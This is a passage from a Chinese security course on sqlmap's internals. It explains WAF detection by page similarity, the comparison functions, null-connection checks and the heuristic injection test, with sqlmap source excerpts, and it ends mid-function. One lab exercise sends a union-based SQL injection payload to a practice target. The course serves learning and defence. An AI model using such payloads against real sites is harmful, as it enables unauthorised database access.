<span class="hljs-comment"># d=0.44444444... </span>
</code></pre>

<p>在这个例子里，我们用SequenceMatcher函数计算了字符串a和字符串b的相似度，计算的结果为“0.4444…”。</p>

<p>这个值是用“2_M/T”这个表达式计算出来的，要想得出结果，我们需要获得变量M和T的值。其中M为a和b相同部分的长度，在这个例子中，因为<code>a</code>和<code>b</code>相同部分为<code>ab</code>，所以M的 值就是2。T则是a和b的长度之和，所以T的值为9。因此，计算结果为“2_<sup>2</sup>⁄<sub>9</sub>=0.4444…”。</p>

<p>相信通过这个例子的学习，你已经可以掌握SequenceMatcher函数的用法，下面让我们趁热打铁，进入到实战训练中，来巩固我们对页面相似度的理解。</p>

<h2 id="实战训练">实战训练</h2>

<p>通过刚才的学习我们知道，sqlmap会运用页面相似度来判断waf存在。为了让你有更加直观的感受，我们可以打开谜团中的“安全狗4.0靶场”进行实战测试。</p>

<p>打开靶场后，我们访问靶场<code>80</code>端口下的<code>inject.php</code>路径，这是一个有waf保护的网站，我们需要通过get方式，上传一个名为<code>id</code>的参数。</p>

<p>我们首先将<code>id</code>参数的值设为1，正常获得的响应内容如下：</p>

<p><img src="assets/35691742b375484ca57a306f61945dd5.jpg" alt="图片"></p>

<p>随后我们将<code>id</code>的参数值设为容易被waf拦截的payload。</p>

<pre><code class="hljs language-csharp">*<span class="hljs-number">1'</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">database</span>(),2 --+*
</span></code></pre>

<p>这样它就会被waf拦截</p>

<p><img src="assets/86a28e16414a428793eab3ed3c52bc70.jpg" alt="图片"></p>

<p>我们将这两个响应的内容进行记录，然后计算它们的页面相似度。</p>

<pre><code class="language-plain"># 正常响应
talent&amp;nbspsec&lt;br /&gt;&lt;br/&gt;SELECT first_name,last_name FROM users WHERE user_id = '1'; 

# waf拦截的响应
您的请求带有不合法参数，已被网站管理员设置拦截!可能原因：您提交的内容包含危险的攻击请求。
</code></pre>

<p>计算发现他们的页面相似度为零，这符合我们的预期，即存在waf的拦截，那么使用payload前后的页面相似度就会较低。</p>

<h2 id="总结">总结</h2>

<p>这节课，我们学习了sqlmap在工作流程中调用的一个重要的函数start，了解了它的功能和对应的实现方法。</p>

<p>秉持着“知其然，还要知其所以然”的理念，我们除了要知道sqlmap的使用方法，更要了解它的设计思想和工作原理。我们分析了它的源代码，了解到它具有很多功能，这些功能包括，循环处理针对目标配置、测试网络连通性、配置HTTP请求信息、以及判断waf是否存在。</p>

<p>由于判断waf是否存在较难理解，并且存在一个较为生僻的概念，页面相似度，所以我给你介绍了sqlmap是如何判断waf是否存在的。经过分析我们发现，sqlmap会使用易于引起waf拦截的payload来获取响应，并且将它和不使用payload的正常响应进行比较，通过它们的相似度来判断waf存在。如果页面相似度高，就认为目标没有waf的保护，否则我们就认为有waf的保护。最后，我们在实战中验证了这个想法，证实了sqlmap通过页面相似度判断waf存在的可行性。</p>

<p>截止到目前，你已经了解了sqlmap的初始化流程，和针对每个测试目标的配置和检测步骤，下节课，我们将会更加深入地剖析sqlmap的页面相似度算法，并且会正式为你讲解SQL注入测试之前的必经步骤–启发式注入测试。</p>

<h2 id="思考">思考</h2>

<p>页面相似度判断的阈值应该与哪些因素相关呢？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="16 自动化注入神器（三）：sqlmap的核心实现拆解" class="title">16 自动化注入神器（三）：sqlmap的核心实现拆解</h1>
                            <div><p>你好，我是王昊天。</p>

<p>在上节课，我们学习了sqlmap中一个非常重要的函数——start函数。我们了解到，它既可以为每个目标配置请求参数，也会对目标进行一些必要的检测，例如判断目标是否存在waf的保护等。</p>

<p>在讲到如何检测waf时，我们遇到了一个比较陌生的概念，页面相似度。上节课，我给出了一个简单的示例，来帮助你理解它的含义，但是并没有告诉你，页面相似度是如何计算出来的。相信经过这节课的学习，你就可以解决这个问题。</p>

<h2 id="再看checkwaf函数">再看checkWaf函数</h2>

<p><strong>为了研究页面相似度算法，我们首先需要找到计算页面相似度的代码。</strong>回顾一下上节课的内容，我们在checkwaf函数中学习了页面相似度的概念，但是并未深入研究这一点。现在让我们回到sqlmap的checkWaf函数，着重观察下面这段代码。在这段代码中，系统会判断Request.queryPage函数的返回值是否小于sqlmap设定的默认页面相似度阈值（IPS_WAF_CHECK_RATIO），如果小于，那么就认为存在waf，否则就会认为不存在waf。我们可以从<code>lib.core.settings.py</code>中得出该阈值的大小为 0.5。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">try</span>:
    retVal = (Request.queryPage(place=place, value=value, getRatioValue=<span class="hljs-literal">True</span>, noteResponseTime=<span class="hljs-literal">False</span>, silent=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>, disableTampering=<span class="hljs-literal">True</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) &lt; IPS_WAF_CHECK_RATIO
</code></pre>

<p>经过上述分析，我们可以知道，函数Request.queryPage的返回值就是页面相似度。所以我们只需要对它进行分析，就可以知道页面相似度的算法了。<strong>在进入到该函数之前，我们首先需要关注，传入该函数的参数。</strong>理解这些参数，会帮助你理解sqlmap页面相似度算法的实际运算过程。</p>

<pre><code class="language-python hljs"><span class="hljs-comment">#传入到该函数的参数</span>
place=place 
value=value 
getRatioValue=<span class="hljs-literal">True</span> 
noteResponseTime=<span class="hljs-literal">False</span> 
silent=<span class="hljs-literal">True</span> 
raise404=<span class="hljs-literal">False</span> 
disableTampering=<span class="hljs-literal">True</span>
</code></pre>

<h3 id="request-querypage函数">Request.queryPage函数</h3>

<p>列举完传入到Request.queryPage函数的参数后，我们可以专心地进入到函数内部进行分析。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">queryPage</span>(<span class="hljs-params">value=<span class="hljs-literal">None</span>, place=<span class="hljs-literal">None</span>, content=<span class="hljs-literal">False</span>, getRatioValue=<span class="hljs-literal">False</span>, silent=<span class="hljs-literal">False</span>, method=<span class="hljs-literal">None</span>, timeBasedCompare=<span class="hljs-literal">False</span>, noteResponseTime=<span class="hljs-literal">True</span>, auxHeaders=<span class="hljs-literal">None</span>, response=<span class="hljs-literal">False</span>, raise404=<span class="hljs-literal">None</span>, removeReflection=<span class="hljs-literal">True</span>, disableTampering=<span class="hljs-literal">False</span>, ignoreSecondOrder=<span class="hljs-literal">False</span></span>):

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 对参数进行定义</span>
    get = <span class="hljs-literal">None</span>
    post = <span class="hljs-literal">None</span>
    cookie = <span class="hljs-literal">None</span>
    ua = <span class="hljs-literal">None</span>
    referer = <span class="hljs-literal">None</span>
    host = <span class="hljs-literal">None</span>
    page = <span class="hljs-literal">None</span>
    pageLength = <span class="hljs-literal">None</span>
    uri = <span class="hljs-literal">None</span>
    code = <span class="hljs-literal">None</span>

<span class="hljs-comment"># ...</span>
      payload = agent.extractPayload(value)

<span class="hljs-comment"># 请求参数的配置。</span>

    <span class="hljs-keyword">if</span> PLACE.GET <span class="hljs-keyword">in</span> conf.parameters:
        get = conf.parameters[PLACE.GET] <span class="hljs-keyword">if</span> place != PLACE.GET <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> value <span class="hljs-keyword">else</span> value

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 用配置好的请求参数获取页面信息。</span>

            page, headers, code = Connect.getPage(url=conf.csrfUrl <span class="hljs-keyword">or</span> conf.url, data=conf.data <span class="hljs-keyword">if</span> conf.csrfUrl == conf.url <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, method=conf.csrfMethod <span class="hljs-keyword">or</span> (conf.method <span class="hljs-keyword">if</span> conf.csrfUrl == conf.url <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>), cookie=conf.parameters.get(PLACE.COOKIE), direct=<span class="hljs-literal">True</span>, silent=<span class="hljs-literal">True</span>, ua=conf.parameters.get(PLACE.USER_AGENT), referer=conf.parameters.get(PLACE.REFERER), host=conf.parameters.get(PLACE.HOST))

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 由于传入的参数中getRatioValue为真，进入到if条件中，它会返回两个comparsion的结果，所以返回的类型是这两个结果构成的元组。</span>

    <span class="hljs-keyword">if</span> getRatioValue:
        <span class="hljs-keyword">return</span> comparison(page, headers, code, getRatioValue=<span class="hljs-literal">False</span>, pageLength=pageLength), comparison(page, headers, code, getRatioValue=<span class="hljs-literal">True</span>, pageLength=pageLength)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> comparison(page, headers, code, getRatioValue, pageLength
</code></pre>

<p>这里我将queryPage中，关键部分的代码展示出来，你可以结合代码中的注释学习和理解。该函数首先会定义需要的参数，然后用定义好的参数来配置请求信息。</p>

<p>配置好请求信息之后，我们就可以用<code>Connect.getPage</code>函数获得目标页面的内容。这样我们就获得了在计算页面相似度中需要的第一个参数，即用易于引起waf拦截的payload获取到的页面响应内容。</p>

<p>由于传入的参数<code>getRatioValue</code>的值为<code>True</code>，所以接下来，函数会进入到<code>if</code>条件中运行，我们看到，系统会返回两个comparison的运行结果，所以这里queryPage的返回的是一个元组类型，即<code>(comparison1,comparison2)</code>。</p>

<p>通过公式<code>retVal=request.querypage()[1] or 0 &lt; IPS_WAF_CHECK_RATIO</code>，我们知道这里retVal的值就等于<code>comparison2 or 0 &lt; 0.5</code>。你需要特别注意这里的<code>comparison2 or 0</code>，这是因为comparison函数有可能会返回None，这时候就会将0作为retVal的值。</p>

<h3 id="comparison函数">Comparison函数</h3>

<p>从retVal的结果可以发现，comparison2的数值很重要，下面让我们重点观察<code>comparison2</code>，它的值为<code>comparison(page, headers, code, getRatioValue=True, pageLength=pageLength)</code>，那么接下来我们进入到<code>comparison</code>函数中。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">comparison</span>(<span class="hljs-params">page, headers, code=<span class="hljs-literal">None</span>, getRatioValue=<span class="hljs-literal">False</span>, pageLength=<span class="hljs-literal">None</span></span>):
    _ = _adjust(_comparison(page, headers, code, getRatioValue, pageLength), getRatioValue)
    <span class="hljs-keyword">return</span> _
</code></pre>

<p>可以看到，该函数将<code>_comparison</code>函数的运行结果作为<code>_adjust</code>函数的参数，然后返回<code>_adjust</code>函数的运行结果<code>_</code>。</p>

<p>那么下面我们先进入到<code>_comparison</code>函数中，看看它在不同情况下的返回值是什么。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_comparison</span>(<span class="hljs-params">page, headers, code, getRatioValue, pageLength</span>):

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 当 page 和 pagelength 信息都没有时，返回None。</span>
    <span class="hljs-keyword">if</span> page <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pageLength <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 如果使用者利用了-string/-not-string/-regexp等参数配置了特征文本，那么程序就会使用用户指定的特征文本和获取到的页面信息作对比，作为返回结果，这时返回的结果为（True or False）对应为1或者0。</span>

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>((conf.string, conf.notString, conf.regexp)):
        rawResponse = <span class="hljs-string">"%s%s"</span> % (listToStrValue(_ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> headers.headers <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> _.startswith(<span class="hljs-string">"%s:"</span> % URI_HTTP_HEADER)) <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, page)

        <span class="hljs-keyword">if</span> conf.string:
            <span class="hljs-keyword">return</span> conf.string <span class="hljs-keyword">in</span> rawResponse

        <span class="hljs-keyword">if</span> conf.notString:
            <span class="hljs-keyword">if</span> conf.notString <span class="hljs-keyword">in</span> rawResponse:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
<span class="hljs-comment"># ...</span>

        <span class="hljs-keyword">if</span> conf.regexp:
            <span class="hljs-keyword">return</span> re.search(conf.regexp, rawResponse, re.I | re.M) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 如果使用者配置了code信息，那么就会判断设置的code是否和返回的code一致，若一致就返回1，否则返回0。</span>
    <span class="hljs-keyword">if</span> conf.code:
        <span class="hljs-keyword">return</span> conf.code == code
</code></pre>

<p>从上面的代码中，我们可以知道，如果使用者配置了响应的参数，那么_comparison函数就会将该参数和获取到的实际响应内容进行比较，直接返回比较的结果。</p>

<p>当用户没有配置响应参数时，sqlmap就会创建一个比较函数，与页面响应进行比较，计算出页面相似比。你可能会觉得seqMatcher有些眼熟，事实上它就是我们的老熟人，<code>difflib.SequenceMatcher()</code>这个函数在介绍sqlmap时有提到。</p>

<pre><code class="language-python hljs">    seqMatcher = threadData.seqMatcher

<span class="hljs-comment"># 将之前测试目标的连通性时获取到的标准响应内容放入到比较函数中，这样只需要再把使用payload之后获取到的响应放入其中，就可以实现页面相似度的计算了。</span>
    seqMatcher.set_seq1(kb.pageTemplate)

<span class="hljs-comment"># 当响应为系统的报错信息后，这样比较页面相似度就没有意义，所以返回None。</span>
    <span class="hljs-keyword">if</span> page:
        <span class="hljs-keyword">if</span> kb.errorIsNone <span class="hljs-keyword">and</span> (wasLastResponseDBMSError() <span class="hljs-keyword">or</span> wasLastResponseHTTPError()) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kb.negativeLogic:
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (wasLastResponseHTTPError() <span class="hljs-keyword">and</span> getLastRequestHTTPError() <span class="hljs-keyword">in</span> (conf.ignoreCode <span class="hljs-keyword">or</span> [])):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 当配置中没有设置空连接时，需要删除页面中的动态内容，否则会影响页面相似度的计算。</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.nullConnection:
            page = removeDynamicContent(page)
   seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))

        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pageLength:
            pageLength = <span class="hljs-built_in">len</span>(page)

<span class="hljs-comment"># 当配置中设置空连接后，系统就不会获得页面的响应内容，而仅仅获得响应的长度，这时候就需要根据响应长度来计算页面相似度。</span>
    <span class="hljs-keyword">if</span> kb.nullConnection <span class="hljs-keyword">and</span> pageLength:
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seqMatcher.a:
            errMsg = <span class="hljs-string">"problem occurred while retrieving original page content "</span>
            errMsg += <span class="hljs-string">"which prevents sqlmap from continuation. Please rerun, "</span>
            errMsg += <span class="hljs-string">"and if the problem persists turn off any optimization switches"</span>
            <span class="hljs-keyword">raise</span> SqlmapNoneDataException(errMsg)

<span class="hljs-comment"># 此处的seqMatcher.a，就是之前放入到比较函数中的标准页面响应。</span>
        ratio = <span class="hljs-number">1.</span> * pageLength / <span class="hljs-built_in">len</span>(seqMatcher.a)

        <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">1.</span>:
            ratio = <span class="hljs-number">1.</span> / ratio

<span class="hljs-comment"># 当不配置空链接时，就需要对响应的内容进行比较，需要考虑响应页面的格式不一样（pdf/html），为了防止这个情况导致Unicode编码比较失败，我们将它们都转化为Unicode格式。</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(seqMatcher.a, six.binary_type) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(page, six.text_type):
            page = getBytes(page, kb.pageEncoding <span class="hljs-keyword">or</span> DEFAULT_PAGE_ENCODING, <span class="hljs-string">"ignore"</span>)
        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(seqMatcher.a, six.text_type) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(page, six.binary_type):
            seqMatcher.a = getBytes(seqMatcher.a, kb.pageEncoding <span class="hljs-keyword">or</span> DEFAULT_PAGE_ENCODING, <span class="hljs-string">"ignore"</span>)

<span class="hljs-comment"># 转化之后，当使用payload获取到的响应和标准响应有一个不存在，就无法比较页面相似度，返回None。</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (page, seqMatcher.a)):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 当它们都存在且相等时，内容完全一致，页面相似度为1。</span>
        <span class="hljs-keyword">elif</span> seqMatcher.a <span class="hljs-keyword">and</span> page <span class="hljs-keyword">and</span> seqMatcher.a == page:
            ratio = <span class="hljs-number">1.</span>

<span class="hljs-comment"># 当无法根据页面内容来计算页面相似度时，会选择用其他方法计算页面相似度。</span>
        <span class="hljs-keyword">elif</span> kb.skipSeqMatcher <span class="hljs-keyword">or</span> seqMatcher.a <span class="hljs-keyword">and</span> page <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>(<span class="hljs-built_in">len</span>(_) &gt; MAX_DIFFLIB_SEQUENCE_LENGTH <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (seqMatcher.a, page)):
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> page <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> seqMatcher.a:
                <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(seqMatcher.a == page)
            <span class="hljs-keyword">else</span>:
                ratio = <span class="hljs-number">1.</span> * <span class="hljs-built_in">len</span>(seqMatcher.a) / <span class="hljs-built_in">len</span>(page)
                <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">1</span>:
                    ratio = <span class="hljs-number">1.</span> / ratio
        <span class="hljs-keyword">else</span>:
            seq1, seq2 = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>

<span class="hljs-comment"># 当配置中设置根据页面的标题比较时，会进入到下面的语句中。</span>
            <span class="hljs-keyword">if</span> conf.titles:
                seq1 = extractRegexResult(HTML_TITLE_REGEX, seqMatcher.a)
                seq2 = extractRegexResult(HTML_TITLE_REGEX, page)
            <span class="hljs-keyword">else</span>:

<span class="hljs-comment"># 当配置中设置有仅比较文本内容时，就会利用`getFilteredPageContent`来提取其中的文本信息。</span>
                seq1 = getFilteredPageContent(seqMatcher.a, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> seqMatcher.a
                seq2 = getFilteredPageContent(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> page

<span class="hljs-comment"># 当在上述操作中获得的seq1或者seq2的值为None时，就无法判断页面相似度，返回 None。</span>
            <span class="hljs-keyword">if</span> seq1 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> seq2 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>

<p>在不同的情况下，seqMatcher的结果有不同的计算方式，我们可以结合代码中的注释进行深入的了解。</p>

<p>当我们需要比较两个页面中的内容，来计算页面相似度时，我们需要删除页面中的<code>REFLECTED_VALUE_MARKER</code>，防止它干扰计算。想要知道<code>REFLECTED_VALUE_MARKER</code>是什么，我们需要回顾下之前获取页面响应内容的参数配置。</p>

<p>在一些情况下，比如，当页面将输入的参数显示在页面上时，payload会回显在页面上。这些payload显然会影响我们计算页面相似度。那么sqlmap是如何解决这个问题的呢？</p>

<p>在之前queryPage的函数中，参数<code>removeReflection</code>的值被设置为<code>True</code>，所以sqlmap在获取页面的时候，会将payload的值替换为<code>REFLECTED_VALUE_MARKER</code>的值。下面这段代码，会去除页面内容中的<code>REFLECTED_VALUE_MARKER</code>，防止它的存在影响页面相似度的判断。</p>

<pre><code class="language-python hljs">            seq1 = seq1.replace(REFLECTED_VALUE_MARKER, <span class="hljs-string">""</span>)
            seq2 = seq2.replace(REFLECTED_VALUE_MARKER, <span class="hljs-string">""</span>)

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 将它们计算出一个哈希元组，并在缓存中查找是否存在这个元组，如果存在则无需再次计算，否则需要计算出一个页面相似度。计算出之后，将该数据存入到缓存中。</span>
            <span class="hljs-keyword">else</span>:
                key = (<span class="hljs-built_in">hash</span>(seq1), <span class="hljs-built_in">hash</span>(seq2))

            seqMatcher.set_seq1(seq1)
            seqMatcher.set_seq2(seq2)

            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> kb.cache.comparison:
                ratio = kb.cache.comparison[key]
            <span class="hljs-keyword">else</span>:
                ratio = <span class="hljs-built_in">round</span>(seqMatcher.quick_ratio() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.heavilyDynamic <span class="hljs-keyword">else</span> seqMatcher.ratio(), <span class="hljs-number">3</span>)

            <span class="hljs-keyword">if</span> key:
                kb.cache.comparison[key] = ratio

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 最后会返回页面相似度的值。</span>
    <span class="hljs-keyword">if</span> getRatioValue:
        <span class="hljs-keyword">return</span> ratio
</code></pre>

<p>这样我们就获得了<code>_comparison</code>函数的返回值，也就是传入到adjust函数中的参数的值。</p>

<p>下面让我们一起进入到adjust函数内，对获取到的页面相似度做一些处理，获取最终的页面相似度的值。我们可以将它简单理解为，<strong>如果sqlmap携带了攻击的载荷，但是响应内容和没有攻击载荷的sqlmap是相同的，就可以判定出目标应用不存在waf</strong>。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_adjust</span>(<span class="hljs-params">condition, getRatioValue</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>((conf.string, conf.notString, conf.regexp, conf.code)):
        retVal = <span class="hljs-keyword">not</span> condition <span class="hljs-keyword">if</span> kb.negativeLogic <span class="hljs-keyword">and</span> condition <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> condition
    <span class="hljs-keyword">else</span>:
        retVal = condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)

    <span class="hljs-keyword">return</span> retVal
</code></pre>

<p>这样checkwaf函数就执行完成了，让我们再次回到start函数内部，继续学习它的运行流程。我们可以发现，<strong>检测完waf之后，系统会判断是否配置了空连接</strong>。</p>

<p>如果配置了空连接，在与标准响应进行比较的环节，就不再需要获得完整的页面响应内容，仅仅需要获得页面响应内容的长度，将它的长度和标准响应页面的长度进行比较，就能获得页面相似度。</p>

<p>那么在判断页面相似度的时候，就不需要获得完整的页面的响应内容和标准响应进行比较，而仅仅需要获得页面响应内容的长度，将它的长度和标准响应页面的长度进行比较即可获得页面相似度。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">if</span> conf.nullConnection:
    checkNullConnection()
</code></pre>

<p>做完上述工作后，sqlmap就进入到了下一个阶段，即注入点检测阶段。这部分的内容我们会在下一节课中学习。</p>

<h2 id="总结">总结</h2>

<p>这节课，我们详细学习了sqlmap中的页面相似度算法。</p>

<p>我们首先回顾了之前学过的checkwaf函数，通过对这个函数进行分析，我们找到了计算页面相似度的函数Request.querypage。</p>

<p>为了更好地理解它，我们进入到函数内部进行观察。经过对它代码的分析，我们知道，它首先对测试目标做了请求的参数的配置，然后给目标发送请求信息，在获取到页面的内容之后，将内容传递给comparison函数进行比较。</p>

<p>根据用户配置的不同情况，comparison函数会采用不同的页面相似度算法来进行计算。值得一提的是，该函数会在比较两个页面的内容时，删掉其中的payload内容，避免存在影响计算结果的因素。</p>

<p>截止目前，你已经掌握了sqlmap对waf检测的方法原理，下节课我们将学习，如何对目标进行自动化的多种SQL注入攻击。</p>

<h2 id="思考">思考</h2>

<p>sqlmap的页面相似度算法有什么值得改进的地方吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center"><a target="_blank" href="https://www.aliyun.com/minisite/goods?userCode=lc4iupk4">阿里云2C2G3M 99元/年，老用户 也可以哦</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="17 自动化注入神器（四）：sqlmap的核心功能解析" class="title">17 自动化注入神器（四）：sqlmap的核心功能解析</h1>
                            <div><p>你好，我是王昊天。</p>

<p>在上节课中，我们重点学习了sqlmap中一个非常重要的算法——页面相似度算法。相信你对页面相似度这个概念会有更加清晰的认知，不但知道它是什么含义，而且知道它是如何计算出来的。解决了这个大难点之后，我在上节课的结尾提出了一个空连接检测功能，有了它，sqlmap就可以大大提高执行效率。完成了检测，sqlmap就进入到实际的SQL注入测试阶段了。</p>

<p>在SQL注入测试阶段，系统首先会检测有哪些注入点，然后对这些注入点逐一发送合适的payload，检测注入是否成功。如果注入成功，那么系统会将注入点存储下来，最后对它们进行输出。</p>

<p>这节课，我们就来正式学习sqlmap的SQL注入测试过程。</p>

<h2 id="注入点检测">注入点检测</h2>

<p>在SQL正式注入测试之前，sqlmap会对每个目标的参数进行过滤。将那些非动态的，不存在注入可能的参数剔除掉，留下可能的注入点。这样sqlmap仅需要对这些可能的注入点进行正式的注入测试即可。</p>

<h3 id="动态参数检测">动态参数检测</h3>

<p>我们首先来看sqlmap是如何检测动态参数的。这部分代码依旧在start函数中，紧接着空连接检测出现。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># sqlmap首先对所有可用于注入测试的参数进行简单的优先级排序。</span>
   parameters = <span class="hljs-built_in">list</span>(conf.parameters.keys())
<span class="hljs-comment"># 定义测试列表的顺序。（从后到前）</span>
   orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)
<span class="hljs-comment"># 对测试参数排好序之后，系统开始对参数进行过滤操作。</span>
   proceed = <span class="hljs-literal">True</span>
   <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> parameters:
       skip = <span class="hljs-comment"># ...</span>
       <span class="hljs-keyword">if</span> skip:
           <span class="hljs-keyword">continue</span>
       <span class="hljs-keyword">if</span> place <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> conf.paramDict:
           <span class="hljs-keyword">continue</span>
       paramDict = conf.paramDict[place]
       paramType = conf.method <span class="hljs-keyword">if</span> conf.method <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="hljs-keyword">else</span> place
<span class="hljs-comment"># ...</span>
       <span class="hljs-keyword">for</span> parameter, value <span class="hljs-keyword">in</span> paramDict.items():
           <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> proceed:
               <span class="hljs-keyword">break</span>
<span class="hljs-comment"># 经过过滤，将该参数加入到测试过的参数中，防止重复测试。</span>
           kb.testedParams.add(paramKey)
</code></pre>

<p>我们可以结合代码中的注释，来理解参数的过滤。首先sqlmap会对待测参数进行一个优先级排序。在排序完成之后，系统会根据用户的配置信息，对这些参数进行过滤操作。这里我举一个例子来让你更加容易理解这一步骤。例如，当用户配置的检测level小于2时，那么系统就会跳过对cookie参数的检测过程。</p>

<p>过滤完成之后，我们就会进入到你最熟悉的一步——SQL注入测试过程。让我们结合代码，分析sqlmap是如何进行SQL注入测试的。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">if</span> testSqlInj:
<span class="hljs-comment"># 开始注入测试</span>
    <span class="hljs-keyword">try</span>:
<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 进入启发式注入测试。</span>
        check = heuristicCheckSqlInjection(place, parameter)
<span class="hljs-comment"># 当启发式注入测试失败，就跳过该参数。</span>
        <span class="hljs-keyword">if</span> check != HEURISTIC_TEST.POSITIVE:
            <span class="hljs-keyword">if</span> conf.smart <span class="hljs-keyword">or</span> (kb.ignoreCasted <span class="hljs-keyword">and</span> check == HEURISTIC_TEST.CASTED):
<span class="hljs-comment"># ... </span>
               <span class="hljs-keyword">continue</span>
<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 通过启发式注入测试后，就会进入到SQL注入测试阶段。</span>
        injection = checkSqlInjection(place, parameter, value)
</code></pre>

<h3 id="启发式注入测试">启发式注入测试</h3>

<p>如果一个参数被检测为注入点，那我们就可以对它进行注入测试。为了提高注入测试的效率，系统会过滤一些注入成功率较低的注入点，这需要首先对它进行一个启发式注入测试。下面让我们结合代码，对启发式注入测试有个更具体的理解。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">heuristicCheckSqlInjection</span>(<span class="hljs-params">place, parameter</span>):

<span class="hljs-comment"># 如果配置中设置了跳过启发式注入测试，就返回结果None，当使用者没有特殊配置conf.start这个配置项为false，就会跳过该参数的注入检测。</span>
    <span class="hljs-keyword">if</span> conf.skipHeuristics:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

